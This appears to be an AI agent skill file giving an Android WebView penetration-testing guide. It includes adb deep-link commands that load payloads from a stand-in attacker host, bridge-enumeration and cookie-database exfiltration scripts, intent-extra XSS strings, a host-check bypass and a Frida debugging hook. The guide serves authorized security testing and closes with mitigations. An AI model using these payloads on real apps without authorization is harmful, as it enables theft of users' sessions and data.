---
name: android-webview-pentest
description: Android WebView security assessment and exploitation. Use this skill whenever the user mentions WebView vulnerabilities, Android app pentesting, JavaScript bridges, deep-linking attacks, file access in WebViews, or needs to test WebView configurations. Trigger for any Android security testing involving WebView components, @JavascriptInterface exploitation, intent-based WebView attacks, or WebView remote debugging.
---

# Android WebView Pentesting

A comprehensive guide for assessing and exploiting WebView vulnerabilities in Android applications.

## Quick Start

```bash
# Basic WebView reconnaissance
adb shell dumpsys window | grep -i webview

# Check for remote debugging
adb shell dumpsys activity | grep -i debug

# List exported activities that might host WebViews
aapt dump xmltree app.apk AndroidManifest.xml | grep -A5 "exported"
```

## Attack Surface Overview

WebViews are a high-value target because they:
- Can access app cookies, local storage, and session data
- May expose native functionality via JavaScript bridges
- Often have misconfigured file access settings
- Can be triggered via deep links from other apps

## Phase 1: Reconnaissance

### 1.1 Identify WebView Usage

Decompile the APK and search for WebView indicators:

```bash
# Decompile
apktool d app.apk -o decompiled

# Search for WebView references
grep -r "WebView" decompiled/
grep -r "loadUrl" decompiled/
grep -r "addJavascriptInterface" decompiled/
grep -r "setJavaScriptEnabled" decompiled/
```

### 1.2 Check Manifest for Deep Links

Look for exported activities with VIEW+BROWSABLE intent filters:

```xml
<!-- Vulnerable pattern -->
<activity android:name=".MainActivity" android:exported="true">
  <intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="myscheme" android:host="com.example.app" />
  </intent-filter>
</activity>
```

**Red flags:**
- `android:exported="true"` with VIEW intent
- Custom schemes that route to WebView activities
- Multiple intent-filter paths (one for external browser, one for internal WebView)

### 1.3 Enumerate JavaScript Interfaces

Search for `@JavascriptInterface` annotations:

```bash
grep -r "@JavascriptInterface" decompiled/
grep -r "addJavascriptInterface" decompiled/
```

Note the bridge object names (e.g., `javascriptBridge`, `xbridge`, `AndroidInterface`).

## Phase 2: Configuration Analysis

### 2.1 File Access Settings

Check these critical settings in the decompiled code:

| Setting | Method | Risk if Enabled |
|---------|--------|----------------|
| File access | `setAllowFileAccess(true)` | Read `file://` paths |
| Universal file URL access | `setAllowUniversalAccessFromFileURLs(true)` | Cross-origin file access (deprecated) |
| File URL access | `setAllowFileAccessFromFileURLs(true)` | File scheme cross-origin (deprecated) |
| JavaScript | `setJavaScriptEnabled(true)` | JS execution, bridge access |
| Mixed content | `setMixedContentMode()` | HTTP content in HTTPS context |

**Default behavior:**
- Android R+: `setAllowFileAccess()` defaults to `false`
- Jelly Bean+: Universal/file URL access defaults to `false`
- JavaScript defaults to `false`

### 2.2 Remote Debugging Check

Look for debugging enabled:

```java
// Vulnerable - always enabled
WebView.setWebContentsDebuggingEnabled(true);

// Semi-vulnerable - enabled in debug builds
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE)) {
    WebView.setWebContentsDebuggingEnabled(true);
}
```

**Test:**
```bash
# Check if debugging is active
adb shell dumpsys webview | grep -i debug

# Try Chrome DevTools
adb forward tcp:9222 localabstract:chrome_devtools_remote
# Then open chrome://inspect in Chrome browser
```

## Phase 3: Exploitation Techniques

### 3.1 Deep-Link WebView Injection

Force the app to load attacker-controlled content:

```bash
# Template - implicit intent
adb shell am start -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Template - explicit activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# With extra parameters
adb shell am start -n com.example/.SupportWebView \
  -es support_url "https://attacker.tld/xss.html"
```

**Payload to test:**
```html
<!DOCTYPE html>
<html>
<head>
  <script>
    // Test JavaScript execution
    console.log('JS executed in WebView context');
    
    // Enumerate JavaScript bridges
    for (let k in window) {
      try {
        if (typeof window[k] === 'object' || typeof window[k] === 'function') {
          console.log('[JSI]', k);
        }
      } catch(e) {}
    }
    
    // Test file access
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'file:///data/data/' + document.domain + '/databases/', true);
    xhr.onload = function() { console.log('File access:', this.responseText); };
    xhr.send();
  </script>
</head>
<body><h1>WebView Test</h1></body>
</html>
```

### 3.2 JavaScript Bridge Exploitation

#### Basic Bridge Call

If you find a bridge object (e.g., `javascriptBridge`):

```html
<script>
  // Call exposed method
  alert(javascriptBridge.getSecret());
  
  // Try common method names
  try { alert(javascriptBridge.getVersion()); } catch(e) {}
  try { alert(javascriptBridge.getUserInfo()); } catch(e) {}
  try { alert(javascriptBridge.getAuthToken()); } catch(e) {}
</script>
```

#### Dispatcher-Style Bridge Abuse

Many apps use a generic dispatcher pattern:

```javascript
// Minimal callback sink
window.WebViewJavascriptBridge = {
  _handleMessageFromObjC: function(data) { console.log(data); }
};

// Call handler via dispatcher
const payload = JSON.stringify({
  handlerName: 'toBase64',
  callbackId: 'cb_' + Date.now(),
  data: { uri: 'file:///data/data/<pkg>/app_webview/Default/Cookies' }
});

xbridge.invokeMethod(payload);
```

**Common handler names to try:**
- `toBase64`, `fromBase64`
- `readFile`, `writeFile`
- `getCookies`, `setCookies`
- `getUserInfo`, `getAuthToken`
- `executeCommand`, `runShell`

#### Cookie Exfiltration

Target common cookie database paths:

```javascript
const cookiePaths = [
  'file:///data/data/<pkg>/app_webview/Default/Cookies',
  'file:///data/data/<pkg>/app_webview_<pkg>/Default/Cookies',
  'file:///data/data/<pkg>/databases/webview.db'
];

cookiePaths.forEach(path => {
  const payload = JSON.stringify({
    handlerName: 'toBase64',
    callbackId: 'cb_' + Date.now(),
    data: { uri: path }
  });
  xbridge.invokeMethod(payload);
});
```

### 3.3 Intent Extra XSS

Test for reflected XSS via Intent extras:

```bash
# Test with HTML injection
adb shell am start -n com.victim/.ExportedWebViewActivity \
  --es data '<img src=x onerror="alert(document.cookie)">'

# Test with JavaScript
adb shell am start -n com.victim/.ExportedWebViewActivity \
  --es data '<script>alert(1)</script>'

# Test with full HTML
adb shell am start -n com.victim/.ExportedWebViewActivity \
  --es data '<html><body><script>javascriptBridge.getSecret()</script></body></html>'
```

### 3.4 Order-of-Checks Bypass

Some apps enable JavaScript before URL validation:

```bash
# Craft URL that passes early checks but fails final validation
adb shell am start -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```

**Detection:** If your payload executes JavaScript, the app likely has an order-of-checks bug.

### 3.5 Host Check Bypass

Look for flawed `endsWith()` checks:

```java
// Vulnerable pattern
if (!host.endsWith(".trusted.com")) {
  if (!".trusted.com".endsWith(host)) {
    z = false;
  }
}
```

**Exploit:** Use hosts like `trusted.com.evil.com` or `com.trusted.com` that satisfy the second clause.

## Phase 4: Advanced Techniques

### 4.1 Enable Remote Debugging (Frida)

For release builds without debugging enabled:

```javascript
// Frida script to enable WebView debugging
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');
    WebView.setWebContentsDebuggingEnabled.overload('boolean').implementation = function(enabled) {
        console.log('[*] WebView.setWebContentsDebuggingEnabled(' + enabled + ')');
        this.setWebContentsDebuggingEnabled(true);
    };
});
```

### 4.2 javascript:// URL Primitive

If the app executes `loadUrl("javascript:" + payload)` in privileged contexts:

```bash
# Find the code path that triggers this
grep -r 'loadUrl.*javascript' decompiled/

# Force navigation to that context, then trigger the primitive
```

### 4.3 Content Provider Access

WebViews can access `content://` URIs:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'content://com.example.provider/path/to/data', true);
xhr.onload = function() { console.log(this.responseText); };
xhr.send();
```

## Detection Patterns

### Code Patterns to Hunt

```bash
# JavaScript bridge exposure
grep -r "addJavascriptInterface" decompiled/

# File access configuration
grep -r "setAllowFileAccess" decompiled/
grep -r "setJavaScriptEnabled" decompiled/

# Deep link handlers
grep -r "getQueryParameter.*url" decompiled/
grep -r "onNewIntent" decompiled/

# Remote debugging
grep -r "setWebContentsDebuggingEnabled" decompiled/

# Intent extra usage
grep -r "getStringExtra" decompiled/
grep -r "loadData" decompiled/

# javascript:// execution
grep -r 'loadUrl.*javascript' decompiled/
grep -r 'evaluateJavascript' decompiled/
```

### Runtime Indicators

- Large Base64 strings in WebView responses (file exfiltration)
- Console logs showing bridge enumeration
- Unexpected JavaScript execution in WebView context
- Cookie/session data appearing in network traffic

## Mitigation Checklist

For developers reviewing findings:

- [ ] Disable JavaScript unless absolutely required
- [ ] Never enable `setAllowFileAccess()` for untrusted content
- [ ] Use strict allowlists for deep-link URL validation
- [ ] Canonicalize URLs once; validate against single source of truth
- [ ] Scope `@JavascriptInterface` to trusted pages only
- [ ] Avoid `loadUrl("javascript:")` in privileged contexts
- [ ] Disable remote debugging in release builds
- [ ] Escape all user input before `loadData()`
- [ ] Use `content://` with permissions instead of `file://`
- [ ] Implement per-call authorization for bridge methods

## References

- [Android WebView Security](https://developer.android.com/guide/webapps/security)
- [HackTricks WebView Attacks](https://book.hacktricks.xyz/pentesting-mobile/android-pentesting/webview-attacks)
- [Pwn2Own 2024 Samsung S24](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Intent Injection](intent-injection.md)
